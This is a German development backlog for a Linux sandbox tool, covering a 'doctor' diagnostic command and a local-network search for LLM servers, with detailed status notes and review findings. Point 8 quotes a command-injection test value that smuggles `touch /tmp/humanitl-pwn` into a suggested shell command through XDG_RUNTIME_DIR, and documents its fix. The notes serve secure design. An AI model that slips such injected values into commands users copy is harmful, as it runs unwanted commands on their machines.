Ausgabe (Text): `[ok] bubblewrap 0.11.0`, `[fail] user namespaces: unshare -Ur failed (EPERM) — fix: …`. JSON: `{ "checks": [{ "id", "status", "evidence", "diagnostic"? }] }`.

### Schritte
1. `doctor.rs` mit `trait Check { fn run(&self) -> CheckOutcome }` und den elf Checks, jeder in < 2 s, parallel mit `std::thread::scope`.
2. CLI-Subkommando, Text- und JSON-Ausgabe, Exit-Codes.
3. RPC `Doctor`, Setup-Screen-Liste (wiederverwendet `DiagnosticCard`).
4. Fixture-Tests: jede Prüfung gegen gemockte Umgebung (Env-Variablen, Fake-`bwrap`-Skript im PATH).

### Tests
- `doctor::tests::bwrap_missing_is_fail`, `userns_blocked_apparmor_hint`, `xdg_runtime_missing`, `json_shape_stable` (Snapshot).
- CLI-Test: Exit 3 bei einem `fail`, 0 bei nur `warn`.

### Akzeptanzkriterien
- [x] `humanitl doctor` auf der Entwicklungsmaschine: alle Zeilen ok oder warn mit Fix. Beleg im Stand-Abschnitt.
- [x] Jede Nicht-ok-Zeile hat `why` und `fix`. Beleg im Stand-Abschnitt.
- [x] Setup-Screen zeigt dieselben Zeilen, Start-Button bleibt bei `fail` deaktiviert. **Der Stand-Abschnitt unten ist an dieser Stelle überholt:** Er stammt vom 2026-09-05, und `app/lib/features/setup/widgets/doctor_list.dart` hat HUM-044 danach gebaut. Gemessen am 2026-09-06, beide Hälften einzeln ausgeführt: `the machine list shows every line the daemon sent` zeigt neun Zeilen — elf minus die zwei mit eigener Reihe — und die Überschrift verspricht genau diese neun; `start_button_enabled_only_when_all_ok` setzt eine Maschine ohne `bwrap` und findet den Knopf aus, die Sandbox-Zeile auf „blocks the start" und `DOCTOR_001` auf dem Schirm. Beide in `app/test/features/setup/setup_test.dart`.
- [x] `--json` ist stabil (Snapshot-Test). Beleg im Stand-Abschnitt.

### Fallstricke
- `unshare -Ur` kann auf gehärteten Systemen hängen statt scheitern; Timeout 2 s.
- Auf Ubuntu 24.04+ ist unprivilegiertes userns per AppArmor eingeschränkt, das System-`bwrap` hat aber ein Profil. Deshalb prüft der Doctor `bwrap --unshare-user true`, nicht nur `unshare`.
- Keine Prüfung darf Netzwerk außer dem konfigurierten LLM-Endpoint ansprechen.

### Referenzen
BACKLOG.md Prinzip 9; HUM-044; Ubuntu userns-Restriktion (https://ubuntu.com/blog/ubuntu-23-10-restricted-unprivileged-user-namespaces).

### Stand (2026-09-05): Daemon und Kommandozeile gebaut, zehn Abweichungen, die Oberflächenhälfte offen

> **Nachtrag 2026-09-06.** Die Oberflächenhälfte ist seit HUM-044 gebaut:
> `app/lib/features/setup/widgets/doctor_list.dart` zeichnet die Zeilen des
> Doctors, und zwei Tests messen sie (siehe das Kästchen oben). Was unten
> über sie steht, beschreibt den Stand von gestern.

Gebaut sind `humanitl_sandbox::doctor` (die elf Prüfungen, Tatsachen und
Urteil getrennt), die RPC `Doctor` im echten Dienst, der Fake, die
Übersetzung in die Wire-Form, `humanitl doctor [--json] [--probe-llm]` und
`docs/cli.md`. Offen bleibt `app/lib/features/setup/widgets/doctor_list.dart`;
warum, steht unten.

**1. Tatsachen und Urteil sind getrennt, statt `trait Check`.** Schritt 1 der
Spezifikation nennt `trait Check { fn run(&self) -> CheckOutcome }`. Ein Trait
mit einer Methode, die zugleich liest und urteilt, ist nur prüfbar, indem man
den Rechner in den Zustand bringt, um den es geht — auf einer
Entwicklermaschine also gar nicht, und die Prüfung „Kernel ohne
`CONFIG_SECCOMP`" nie. Stattdessen: `doctor::probe` liest die Maschine in
`MachineFacts`, `doctor::checks` urteilt als reine Funktion darüber, und
`doctor::run` setzt beides zusammen. Jede der elf Prüfungen hat damit einen
Test ohne die Lage, die sie prüft; `crates/sandbox/tests/doctor.rs` fährt drei
vollständige Maschinen durch (gesund, kaputt, unlesbar). Auch `ADR-015` bleibt
gewahrt: Es entsteht kein neuer Port, nur eine Datenstruktur.

**2. Eine Prüfung, die nicht laufen konnte, ist `warn` mit `DOCTOR_012`.** Der
Vertrag kennt nur `OK`, `WARN`, `FAIL`, und ein vierter Wert im Enum wäre eine
Proto-Änderung, mit der die Oberfläche nichts anfangen kann. `ok` wäre die
Lüge, gegen die dieses Issue gebaut ist. Der Beleg einer solchen Zeile beginnt
deshalb mit `not measured:`, der Befund nennt Prüfung und Grund, und der `fix`
ist der Befehl, den der Doctor versucht hat — damit trägt auch diese Zeile
etwas Brauchbares, obwohl es nichts zu reparieren gibt. Zwei Codes über die
elf der Spezifikation hinaus: `DOCTOR_012` „nicht durchführbar" und
`DOCTOR_013` „nicht angesprochen". Der Unterschied ist der Kern des nächsten
Punktes.

**3. Der Doctor fasst das Netz nie von selbst an.** Die Spezifikation führt
die LLM-Erreichbarkeit als Prüfung 8 in der Liste, ohne zu sagen, wann sie
läuft. Sie läuft nur mit `humanitl doctor --probe-llm`, und dann über die RPC
`ProbeLlm` (HUM-039) statt über einen zweiten HTTP-Client — `tools/check-deps.sh`
verbietet eine ausgehende Verbindung außerhalb des `Egress`-Ports ohnehin. Vor
dem Verbindungsaufbau steht eine Zeile auf `stderr`, die Endpunkt und Vorgehen
nennt. Ohne den Schalter trägt die Zeile `DOCTOR_013` und den Befehl, der sie
misst. **Die RPC `Doctor` misst sie nie**, und zwar zwangsläufig: `rpc
Doctor(google.protobuf.Empty)` hat kein Feld, in dem ein Client um eine
Verbindung bitten könnte, und eine Verbindung, um die niemand gebeten hat,
baut der Daemon nicht auf. Damit erzeugt auch das Öffnen des Setup-Bildschirms
keine Verbindung — dieselbe Zusage, die HUM-076 als Akzeptanzkriterium führt.
Der Schalter heißt `--probe-llm` und nicht `--llm`: `--llm` ist nach
`CONVENTIONS.md` 3.8 der Zweitname von `--llm-endpoint` und **setzt** die
Adresse.

**4. Der Bericht hat zwei Quellen, und er sagt welche.** ADR-018 verlangt die
RPC; der Doctor beantwortet aber vor allem die Frage eines Menschen, dessen
Daemon gerade nicht läuft. `humanitl doctor` ruft deshalb `Doctor()`, wenn ein
Daemon antwortet, und führt sonst dieselben Prüfungen aus derselben Crate im
eigenen Prozess aus. Es gibt keine zweite Umsetzung, nur eine zweite Stelle,
an der dieselbe läuft; welche es war, steht als `source` in der Ausgabe, weil
`PATH` und `$XDG_RUNTIME_DIR` des Daemons die seiner Unit sind und nicht die
des Terminals. Zwei Zeilen kommen immer vom Client: `daemon` (nur ein Client
weiß, ob er den Daemon erreicht — der Daemon selbst schickt sie als „nicht
gemessen") und `llm`. Geurteilt wird über beide trotzdem in der Crate
(`doctor::daemon_line`, `doctor::llm_line`).

**5. Zwei Aufrufe brauchen eine Umgebung, `bwrap` bekommt keine.** Der erste
Lauf auf der Entwicklungsmaschine meldete `systemd_user` und `agent` als
„nicht gemessen" — nicht weil die Maschine kaputt war, sondern weil der Doctor
jeden Aufruf mit `env_clear()` startete: `systemctl --user` findet ohne
`$XDG_RUNTIME_DIR` und `$DBUS_SESSION_BUS_ADDRESS` seinen Bus nicht, und das
Startskript von OpenCode bricht ohne `$HOME` mit `unbound variable` ab. Diese
beiden Aufrufe bekommen jetzt genau vier Variablen (`PATH`, `HOME`,
`XDG_RUNTIME_DIR`, `DBUS_SESSION_BUS_ADDRESS`), nie die ganze Umgebung und nie
eine Lader-Variable. Jeder Start von `bwrap` bleibt bei der leeren Umgebung,
auch die Namensraum-Probe: `bwrap` bleibt als PID 1 des Namensraums stehen,
und `/proc/1/environ` zeigte sonst die Umgebung des Nutzers (ESC-2-Befund).

**6. Die Ankündigung der Verbindung lässt sich nicht abstellen.** Sie ging
zuerst durch `Renderer::note`, und das schweigt unter `--json` und unter `-q` —
also genau dort, wo ein Skript oder ein knapper Aufruf die Verbindung auslöst.
Sie geht jetzt an `Renderer` vorbei direkt auf `stderr`
(`cmd/doctor.rs::announce`). `stdout` bleibt dabei ein einziger JSON-Wert; ein
Ausgabeschalter darf nicht bestimmen, ob ein Mensch erfährt, dass sein Rechner
gleich eine Verbindung aufbaut.

**7. Ein Grund darf nicht länger sein, als der Vertrag ihn trägt.** Auf dem Weg
zur Oberfläche geht jedes `why` durch `sanitize_note` und wird auf
`NOTE_MAX_CHARS` (500) gekappt. Der erste Befund von `userns` trug die
vollständige `bwrap`-Zeile mit zwanzig Argumenten und kam beim Menschen mitten
im Wort abgeschnitten an — gemessen am 2026-09-05 an einem `bwrap`, das die
Namensraum-Probe verweigert. Die Zeile steht jetzt im `fix`, wo man sie
kopiert, und der Grund nennt nur Programm, Ausgang und erste Fehlermeldung.
`crates/sandbox/tests/doctor.rs` hält beides fest: kein `why` über
`NOTE_MAX_CHARS`, kein Beleg über 160 Zeichen, und die Vorgabe der kaputten
Maschine trägt die echte zwanzigteilige Kommandozeile — eine kürzere hätte den
Fehler nie gezeigt.

**8. Ein Wert, der von außen kommt, wird nie durch Interpolation zu einem
Befehl.** Das ist in diesem Projekt der dritte Fall desselben Fehlers, und
deshalb steht die Regel hier als eigener Absatz:

- **HUM-043**: `summary::copy_command` baute ein `rm` aus einem Pfad, den der
  Agent benannt hatte.
- **HUM-106**: `app/lib/core/ui/shell_command.dart` interpolierte
  `export KEY=VALUE` ungequotet in die Zwischenablage.
- **HUM-075**, hier: `XDG_RUNTIME_DIR='/tmp/h; touch /tmp/humanitl-pwn'` ergab
  den Vorschlag `chmod 700 /tmp/h; touch /tmp/humanitl-pwn`, und ein Mensch
  kopiert ihn und führt ihn aus. Dieselbe Lücke bei den Pfaden von
  `df -h`, `ls -ld` und `<program> --version`, und die Darstellung des Aufrufs
  begann schon ungequotet in `doctor::probe`.

Die Regel, die beide vorhandenen Stellen halten und die jetzt als
`humanitl_sandbox::doctor::shell_command` für beliebig viele Wörter dasteht:
Ein Befehl entsteht **nur**, wenn jedes Wort nicht leer ist, `sanitize_note` es
nicht ändert, `shlex::try_quote` es entweder unverändert lässt oder in genau
ein Paar einfacher Anführungszeichen ohne inneres `'` setzt, und `shlex::split`
der fertigen Zeile wieder genau diese Wörter ergibt. Sonst gibt es keinen
Befehl, sondern einen Satz, der sagt warum — im Doctor ein `FixAction::OpenUrl`
auf die Erklärung des Codes.

Damit das nicht wieder auseinanderläuft, trägt `CommandRun` jetzt **Wörter**
und keine fertige Zeile: Aus Wörtern lässt sich ein Befehl bauen, der beweisbar
dieselben Wörter bleibt; aus einer Zeile, in die schon jemand einen Pfad
interpoliert hat, nicht mehr. `summary::copy_command` sollte in einem
Folge-Issue auf `shell_command` umgebaut werden; die Datei gehört gerade einem
anderen Agenten, deshalb steht die Regel zweimal im Baum und nicht einmal.

**9. Ein Vorschlag, der den Zustand nur noch einmal anzeigt, ist keiner.**
`DOCTOR_003` trug `grep Seccomp /proc/self/status` beziehungsweise `uname -r`,
`DOCTOR_004` zweimal `ls -ld <pfad>`. Keiner davon behebt etwas. `DOCTOR_003`
verweist jetzt auf die Erklärung (einen Kernel tauscht man nicht mit einer
Zeile), `DOCTOR_004` schlägt vor, `XDG_RUNTIME_DIR` auf das eigene
Laufzeitverzeichnis zu richten. Die Ausnahme bleibt `DOCTOR_012`: Dort **ist**
der Befehl, den der Doctor versucht hat, das Brauchbare — wer nachsehen will,
bekommt den Weg dorthin.

**10. Kleinere Berichtigungen an der Spezifikation.** Die Tabelle nennt in
Zeile 2 `unshare -Ur`, die Fallstricke widersprechen dem und verlangen
`bwrap --unshare-user`; gebaut ist die zweite Fassung, und die Zeile 2 ist
damit erledigt. Prüfung 9 sucht auch `libappindicator3` — auf Debian 14 ist
das die einzige vorhandene, und eine Prüfung, die sie übersieht, meldete eine
fehlende Tray-Unterstützung, die es gibt. Prüfung 3 unterscheidet zwei Fälle,
die die Spezifikation zu einem macht: kein Feld `Seccomp` in
`/proc/self/status` ist `fail` (Kernel ohne `CONFIG_SECCOMP`), ein Kernel
unter 5.4 nur `warn` (es läuft womöglich, nur ist es hier nicht gemessen).
Prüfung 4 prüft zusätzlich den Eigentümer des Laufzeitverzeichnisses; ein
Verzeichnis, das einem anderen Nutzer gehört, trüge Socket und Token in
fremdes Gebiet.

**11. Sechs Befunde aus den beiden Reviews, alle derselbe Fehler.** Was jedes
Mal fehlte, war eine Messung, die es nicht gab, und die trotzdem als eine galt:

- `systemd_user` las nur `stdout`. Ein `systemctl`, das an seiner Frist starb,
  nachdem es `running` geschrieben hatte, wurde damit grün. Jetzt entscheidet
  der Ausgang vor der Ausgabe: `TimedOut` und `Signalled` sind `DOCTOR_012`,
  und `running` wird nur mit Exit 0 grün.
- `runtime_dir` prüfte `mode & 0o077`, also allein nach außen. `0500`, `0600`
  und `0000` bestanden das und lassen den Start trotzdem scheitern: ohne `+x`
  kommt niemand hinein, ohne `+w` legt der Daemon dort weder `daemon.sock` noch
  das Sitzungs-Token an. Jetzt genau `0700`, und der Grund unterscheidet zu
  offen von zu eng.
- `read_back` nahm `String::from_utf8_lossy`. Ein `bwrap`, das mit 0 endet und
  `\xffbubblewrap 0.9.1` schreibt, galt als gemessene Fassung. Jetzt streng,
  und unlesbare Bytes sind `Reading::Unreadable`.
- `Version::parse` macht aus allem, was es nicht lesen kann, eine Null:
  `bubblewrap 999999999999999999.9` ergab `0.9.0` und bestand damit die
  Mindestprüfung. Der Doctor hat jetzt seinen eigenen, prüfenden Parser;
  `bwrap.rs` bleibt unberührt.
- Die vier Wege zum Daemon (`connect`, `GetInfo`, `Doctor`, `ProbeLlm`) hatten
  keine Frist. Ein Prozess, der den Socket bindet, annimmt und schweigt, hätte
  `humanitl doctor` für immer angehalten — und den Rückfall auf den eigenen
  Prozess **nie** erreicht, also genau die Eigenschaft zunichte gemacht, die
  ihn begründet. Jetzt 3 s für Verbindung und `GetInfo`, 10 s für `Doctor`,
  35 s für `ProbeLlm`; eine abgelaufene Frist ist „nicht erreichbar" und fällt
  zurück. `a_daemon_that_answers_nothing_does_not_hold_the_doctor` hält das mit
  einem stummen Socket fest.
- Der kopierbare Befehl nahm eine Einschleusung an; siehe Punkt 8.

**Eine Mutationsprobe überlebt, und der Grund steht im Code.** Schritt 4 der
Befehls-Regel — `shlex::split` der fertigen Zeile ergibt wieder dieselben
Wörter — lässt sich mit `shlex` 2 nicht auslösen: Was Schritt 3 übrig lässt,
ist entweder unverändert oder einfach zitiert, und beides zerlegt der Leser
wieder zu demselben Wort. Ein Wort, das Schritt 3 besteht und Schritt 4
scheitern ließe, gibt es nicht, also gibt es dazu keinen Test. Der Schritt
bleibt trotzdem stehen, weil er die Zusage ist und nicht ihre Folge: Änderte
`shlex` seine Zitierung, hinge alles daran. Beim Suchen danach fiel auf, dass
zwei Sätze über `shlex` falsch waren — es löst ein enthaltenes `'` **nicht**
als `'a'\''b'` auf, sondern greift zu doppelten Anführungszeichen (`"/w/it's"`,
`"/w/a\\b"`), in denen `$`, Backtick, `\` und `"` ihre Bedeutung behalten.
Solche Wörter ergeben deshalb gar keinen Befehl, und `is_literal_word` hat
jetzt einen eigenen Test, der die Bedingung prüft statt der Form, die `shlex`
gerade wählt.

**12. Zwei eigene Tests maßen die Auslastung der Maschine statt des
Verhaltens.** Die Vorgaben von `doctor::probe` starteten Testskripte mit der
Vorgabefrist von zwei Sekunden; als am 2026-09-05 drei hängende Testbinaries
eines anderen Baums den Rechner belegten, fiel eine Probe in ihre Frist, und
ein Test wurde rot, ohne dass sich am Verhalten etwas geändert hätte. Sie
setzen die Frist jetzt auf zwanzig Sekunden; nur der Test, der die Frist selbst
prüft, behält eine kurze. Ebenso hat der Test mit dem stummen Socket seine
eigene Uhr bekommen (`Harness::run_bounded`): Ein Test, der beweisen soll, dass
ein Befehl **nicht** hängt, darf nicht darauf warten, dass der Prozess von
selbst zurückkommt — sonst hängt er mit, und die Mutation, die die Frist
entfernt, überlebt, weil niemand mehr zusieht.

**Beobachtung außerhalb dieses Issues:** `crates/ipc/tests/terminal.rs`
(`osc52_does_not_reach_host`, `osc8_and_title_are_inert`) verklemmt sich, wenn
zwei Läufe davon gleichzeitig auf derselben Maschine Sandboxen starten. Am
2026-09-05 standen vier solcher Binaries eines anderen Arbeitsbaums zwischen 70
und 97 Minuten fest, mit vierzehn laufenden `bwrap`-Sandboxen; allein läuft
dieselbe Datei in 1,3 s durch, auch auf `HEAD` ohne die Änderungen dieses
Issues. Für die CI ist das ein Zeitzünder, sobald zwei Jobs auf einem Runner
liegen.

**Was in der Spezifikation fehlt oder falsch ist.**

- `backlog/CONVENTIONS.md` 3.8 führt `humanitl doctor` nicht in der Liste der
  Unterkommandos, obwohl das Ziel des Issues es einführt. Die Datei gehört
  nicht zu diesem Issue; die Zeile
  `humanitl doctor [--json] [--probe-llm]` gehört dort ergänzt.
- Die Spezifikation nennt „Fix: Kernel-Update" (Prüfung 3) und
  „`--no-enable-impeller`" (Prüfung 10). Für beides gibt es keinen Befehl, den
  ein `FixAction::CopyCommand` tragen könnte, ohne distro-spezifisch zu werden
  (Nicht-Ziel). Beide tragen deshalb `FixAction::OpenUrl` auf die Erklärung,
  und der konkrete Schritt steht im `why`. Ein Binary, das man mit
  `--no-enable-impeller` starten könnte, gibt es überdies noch nicht: Die
  Oberfläche heißt in `app/linux/CMakeLists.txt` ebenfalls `humanitl`, und
  `packaging/` ist leer.
- Prüfung 6 („Daemon-Socket erreichbar, Version passt") lässt offen, was der
  Daemon selbst darüber sagen soll. Er kann es nicht sagen; siehe Punkt 4.
- Prüfung 10 nennt einen „`FLUTTER_ENGINE`-Hinweis" ohne Bedingung. Die
  Variable steht jetzt im Beleg, wenn sie gesetzt ist, und löst für sich keine
  Warnung aus: Wer sie setzt, weiß, was er tut.

**Akzeptanzkriterien.**

- **Erfüllt:** `humanitl doctor` auf der Entwicklungsmaschine: alle Zeilen `ok` oder
  `warn` mit Fix (Exit 0; gemessen am 2026-09-05, siehe unten).
- **Erfüllt:** Jede Nicht-ok-Zeile hat `why` und `fix`
  (`crates/sandbox/tests/doctor.rs::assert_report_invariants` über drei
  Maschinen, `crates/ipc/tests/ipc_server.rs::doctor_reports_every_check_and_measures_no_network`,
  `bin/humanitl/tests/cli.rs::json_shape_stable`).
- **Offen:** Setup-Screen zeigt dieselben Zeilen, Start-Button bleibt bei `fail`
  deaktiviert. **Offen**: `app/lib/features/setup/widgets/doctor_list.dart`
  braucht `app/l10n/app_en.arb` und `app_de.arb`, und beide Dateien werden
  gerade von anderen Agenten geschrieben (`CLAUDE.md`, Abschnitt
  „Gemeinsam genutzte Dateien"). Die Maschinenhälfte steht: Die RPC antwortet,
  `DoctorReport.checks` trägt die elf Zeilen in Anzeigereihenfolge, und
  `has_failure` ist die eine Frage, an der der Start-Knopf hängt. Es fehlen
  die Strings der elf Zeilenüberschriften und der Satz für den gesperrten
  Knopf.
- **Erfüllt:** `--json` ist stabil (`bin/humanitl/tests/cli.rs::json_shape_stable`:
  feste Schlüssel oben, feste Reihenfolge der Kennungen, `diagnostic` genau
  bei nicht-`ok`). Ein wörtlicher Schnappschuss wäre unehrlich: Die Belege
  nennen gemessene Werte dieser Maschine.

**Die Ausgabe auf der Entwicklungsmaschine (2026-09-05, Debian 14,
Kernel 7.1.10, Wayland, kein Daemon):**

```
        CHECK         EVIDENCE
[ok]    bwrap         bubblewrap 0.12.0 at /usr/bin/bwrap
[ok]    userns        /usr/bin/bwrap --unshare-user opened a namespace
[ok]    seccomp       seccomp available (Seccomp: 0), kernel 7.1.10+deb14-amd64
[ok]    runtime_dir   /run/user/1000 mode 0700, uid 1000
[ok]    systemd_user  systemd user session running
[warn]  daemon        no daemon on /run/user/1000/humanitl/daemon.sock
[ok]    agent         opencode 1.18.25 at /home/…/.local/bin/opencode
[warn]  llm           llm.endpoint is not set
[ok]    tray          /usr/lib/x86_64-linux-gnu/libappindicator3.so.1, XDG_CURRENT_DESKTOP is not set
[ok]    renderer      session wayland, no nvidia module loaded
[ok]    disk_space    141.9 GiB free in /home/…/.local/share
```

**Und drei kaputte Maschinen, ohne Root herbeigeführt** (`PATH` ohne `bwrap`;
ein `bwrap`, das sich als 0.6.0 meldet, samt Laufzeitverzeichnis 0755; ein
`bwrap`, das die Namensraum-Probe mit `Permission denied` verweigert). Alle
drei enden mit Exit 3, jede rote Zeile trägt Grund und Vorschlag:

```
[FAIL]  bwrap         no executable bwrap in PATH=…/bin-none
[warn]  userns        not measured: bwrap --unshare-user was not run because it does not exist on this machine
[FAIL]  runtime_dir   XDG_RUNTIME_DIR is not set

[FAIL]  bwrap         bubblewrap 0.6.0 at …/bin-old/bwrap
[FAIL]  runtime_dir   …/run-loose mode 0755, uid 1000

[FAIL]  userns        …/bin-noperm/bwrap --unshare-user: exit 1
```

Die zweite Zeile des ersten Falls ist der Kern dieses Issues: `bwrap` fehlt,
also **konnte** die Namensraum-Probe nicht laufen — und die Zeile sagt das,
statt grün zu werden, weil niemand hingesehen hat.

## HUM-076 · LLM-Server finden
Sprint: 3 · Größe: M · Abhängigkeiten: HUM-039, HUM-044 · Blockiert: keine

### Kontext
Prinzip 9: Der Nutzer soll keine IP kennen müssen. Ein LAN-Scan ist aber ein Netzwerkvorgang vom Host aus, deshalb nur auf expliziten Klick, sichtbar, nie automatisch.

### Ziel
Button „LLM finden" im Setup (und `humanitl llm discover [--json]`) sucht im lokalen /24 (aus der Default-Route-Schnittstelle) nach OpenAI-kompatiblen Servern und Ollama, listet Host, Port, Produkt, Modelle. Ein Klick übernimmt `llm.endpoint`. Vor dem Scan ein Hinweis: „Sucht im lokalen Netz (192.168.1.0/24) nach LLM-Servern. Sendet nur Verbindungsversuche an Ports 11434, 1234, 8000, 8080."

### Nicht-Ziel
Kein mDNS (Ollama kündigt nichts an). Keine Suche außerhalb des lokalen /24. Keine Übernahme ohne Klick.

### Betroffene Pfade
- `daemon/crates/sandbox/src/llm_discover.rs` (neu; gehört fachlich zur Sandbox-Session, nutzt `Egress::Direct`)
- `daemon/bin/humanitl/src/cmd/llm.rs` (neu)
- `proto/humanitl/v1/humanitl.proto`: `rpc DiscoverLlm(DiscoverRequest) returns (stream DiscoverResult)`
- `app/lib/features/setup/widgets/llm_discover_sheet.dart` (neu)

### Spezifikation
- Kandidaten: 254 Adressen × 4 Ports, TCP-Connect mit 200 ms Timeout, Parallelität 64. Danach pro offenem Port: `GET /api/tags` (Ollama, Antwort `models[]`), sonst `GET /v1/models` (`data[].id`). Timeout 2 s, Antwort ≤ 256 KB.
- Ergebnis `DiscoverResult { host, port, product: ollama|openai_compatible|unknown, models: Vec<String>, latency_ms }`, gestreamt sobald gefunden.
- Der eigene Host (127.0.0.1 und eigene LAN-IP) wird zuerst geprüft und oben gelistet.
- Der Scan läuft im Daemon (Host-Netz), nie in der Sandbox; er ist kein Flow und erscheint nicht in der Queue, wird aber im Audit-Log als `llm_discover` mit Zeit und Subnetz vermerkt.

### Schritte
1. Subnetz aus Default-Route (`/proc/net/route`) ableiten; bei Mehrdeutigkeit alle nicht-Loopback-Interfaces anbieten.
2. Scanner mit `tokio::net::TcpStream::connect` hinter `Egress::Direct`, Semaphore 64.
3. Erkennung per Endpunkt, Modelle extrahieren.
4. RPC, CLI, Sheet mit Fortschritt (x/254) und Abbruch.

### Tests
- `llm_discover::tests::detects_ollama_mock` (axum-Mock auf einem flüchtigen Port von `127.0.0.1`, der dem Test übergeben wird; `experimental.upstream_port_map` gibt es seit HUM-088 nicht mehr).
- `llm_discover::tests::subnet_from_route`.
- Widget-Test: Ergebnisklick setzt `configProvider.llm.endpoint`.

### Akzeptanzkriterien
- [x] Scan eines /24 endet in ≤ 5 s ohne Treffer. Gemessen zweifach: `the_time_budget_of_a_full_scan_holds` rechnet die Zusage über den Konstanten nach (1016 Versuche, 64 gleichzeitig, 200 ms Frist ergeben 3,2 s als schlimmsten Fall), und `a_scan_over_a_full_24_stays_in_the_budget` fährt ein ganzes `/24` auf der Schleife.
- [x] Ollama-Mock wird gefunden, Modelle gelistet (`detects_ollama_mock` gegen `FakeUpstream::ollama`, die Modellnamen kommen aus der Antwort des Servers).
- [x] Ohne Klick kein einziger Verbindungsversuch: `nothing_connects_before_the_search_is_started` zählt sie am Egress-Port, `opening_the_setup_contacts_nothing` prüft dasselbe an der Oberfläche — auch das geöffnete Blatt sucht noch nicht.
- [x] Audit-Eintrag vorhanden. (Gemessen 2026-09-11 mit HUM-050: `server::tests::a_discover_scan_leaves_exactly_one_audit_record` und `server::tests::the_discover_rpc_writes_its_audit_record` in `daemon/crates/ipc/src/server.rs` grün und je unter ihrer Mutation rot; der Record `llm.discover` trägt nur Netz, Ports und die Zahl der Antworten.)

### Fallstricke
- IDS/Firewalls in Firmennetzen melden Port-Scans; deshalb der Hinweistext und die Beschränkung auf vier Ports.
- Ollama ohne `OLLAMA_HOST=0.0.0.0` lauscht nur auf localhost; Ergebnisleere ist dann normal. Hinweistext im Sheet.
- vLLM `/v1/models` kann Auth verlangen (401) ⇒ als `openai_compatible (auth required)` listen, nicht verwerfen.

### Referenzen
BACKLOG.md Prinzip 9, HUM-039; Ollama API (https://docs.ollama.com/api); OpenAI Models-Endpoint.

---

### Stand (2026-09-06)

**Gebaut ist der ganze Weg: Scanner, RPC, Kommandozeile, Blatt.** Der Scanner
liegt in `daemon/crates/proxy/src/llm_discover.rs` und nicht, wie die
Spezifikation vorschlug, in `humanitl-sandbox`: Die Erkennung ist genau die
Probe aus HUM-039 (`LlmProbe`), und die steht im Proxy über demselben
`Egress`- und `Resolver`-Port. Ein zweiter Erkenner neben dem ersten hätte zwei
Wahrheiten über dasselbe gehabt — welche API antwortet, in welcher Reihenfolge
gefragt wird, was ein `401` heißt. Der Scan fügt dem nur zwei Dinge hinzu, die
es vorher nicht gab: das Netz aus der Vorgaberoute und den Verbindungsversuch
mit kurzer Frist.

**Das eigene Netz ohne ein einziges Paket.** `/proc/net/route` nennt
Schnittstelle und Gateway der Vorgaberoute (bei mehreren die mit der kleinsten
Metrik, dieselbe Wahl wie die des Kernels), und ein *verbundener* UDP-Socket
auf dieses Gateway nennt die Quelladresse, die der Kernel wählen würde —
`connect` schickt auf UDP nichts. Daraus wird das `/24` um die eigene Adresse.
Der Weg über `getifaddrs` hätte `unsafe` gebraucht, das die Crate verbietet.

**Weiter als ein `/24` ist eine Weigerung, kein stiller größerer Scan.**
`Subnet::parse` lässt nur `/24` bis `/32` zu und antwortet sonst mit `LLM_008`
samt Zahl der Versuche, die es sonst würden. Das ist die Hälfte der Zusage über
dem Knopf; die andere Hälfte ist der Text selbst, und der steht in derselben
Sprache in `docs/cli.md`, im Blatt und im Modul.

**Der Fortschritt ist Bewegung, keine Zahl.** Die Spezifikation nannte
„Fortschritt (x/254)". Der Vertrag streamt aber Antworten und keine Zählstände,
und eine Prozentzahl, die eine Uhr hochzählt, wäre eine Behauptung ohne
Messung. Das Blatt zeigt deshalb eine Haarlinie, die läuft, solange gesucht
wird, und daneben die Zahl der Server, die geantwortet haben. Wer das ändern
will, braucht ein Feld im Vertrag, nicht eine Animation.

**Ein Klick füllt das Feld und misst die Adresse.** `SetConfig` gibt es bis
HUM-069 nicht; „übernehmen" heißt deshalb: Die Adresse steht im Feld der
Modell-Zeile, und dieselbe Adresse wird sofort mit `ProbeLlm` gemessen. Eine
Zeile, die eine Adresse zeigt und daneben die Messung einer anderen, wäre die
Lüge, die CONVENTIONS 4.13 ausschließt. In der Konfiguration des Daemons landet
sie erst mit HUM-069.

**Ein Server ohne API steht in der Liste und ist nicht übernehmbar.** Die
Spezifikation nennt `unknown` als Produkt, also wird er genannt: Dort horcht
etwas. Ein Knopf „Übernehmen" fehlt ihm trotzdem — ein Klick trüge eine
Adresse in die Einstellung, die nie als Modellserver geantwortet hat.

**Der Audit-Eintrag kam mit HUM-050.** Bis dahin fehlte er mangels
Audit-Log, und das Kästchen blieb offen, statt mit einer `tracing`-Zeile
abgehakt zu werden, die kein Audit ist. Seit HUM-050 schreibt der Scan, sobald
er endet, einen Record `llm.discover` mit Netz, Ports und der Zahl der
Antworten (`relay_scan` in `daemon/crates/ipc/src/server.rs`).

**Aus den beiden Reviews kamen sechs Befunde, und vier davon waren Löcher in
genau der Zusage, um die es hier geht.** Sie stehen hier, weil sie das Muster
zeigen: Eine Grenze, die nur im Typ steht, ist keine Grenze, solange die
Anfrage eines Clients daran vorbeikommt.

- **Ein fremdes `/24` war erlaubt.** `Subnet::parse` prüfte die *Breite* und
  nicht den *Ort*: `--subnet 8.8.8.0/24` hätte über den Daemon ein Netz
  gescannt, das dem Nutzer nicht gehört. Der Dienst ermittelt jetzt immer das
  eigene Netz und nimmt eine Angabe nur an, wenn sie darin liegt (oder in der
  Schleife); sonst `LLM_008` mit beiden Netzen im Text.
- **Die Portliste war unbegrenzt.** Tausend Ports in der Anfrage wären 254 000
  Verbindungsversuche gewesen, und ungültige Werte fielen still weg, sodass
  eine Liste aus lauter Unsinn wie „Vorgabe" aussah. Jetzt: höchstens vier
  verschiedene, keine `0`, kein Wert jenseits von `u16`, jede Verletzung ein
  Befund.
- **Ein Präfix jenseits von 32 war eine Panik.** `u32::MAX >> 33` stürzt in
  Rust ab, und die Zahl kam aus der Anfrage. Jetzt `checked_shr` hinter einer
  Prüfung, die `/33` als „kein Präfix" abweist.
- **Das Schließen des Blattes beendete den Scan nur ungefähr.** Das `break`
  traf die innere Schleife, und die 64 laufenden Aufgaben liefen bis zu zwei
  Sekunden weiter. Jetzt `abort_all` und `break 'sweep`.
- **Eine Vorgaberoute ohne Gateway ist ein VPN.** Ihr Gateway steht als
  `00000000` in der Tabelle, ein UDP-Socket auf `0.0.0.0` landet auf der
  Schleife, und die Suche wäre still über `127.0.0.0/24` gelaufen. Jetzt
  zählen nur Routen mit `RTF_UP | RTF_GATEWAY` und einem Gateway, das keines
  ist.
- **Ein `401` sagt nichts über die API.** Die Probe fragt zuerst `/api/tags`;
  wer dort eine Anmeldung verlangt, kann alles Mögliche sein. Die
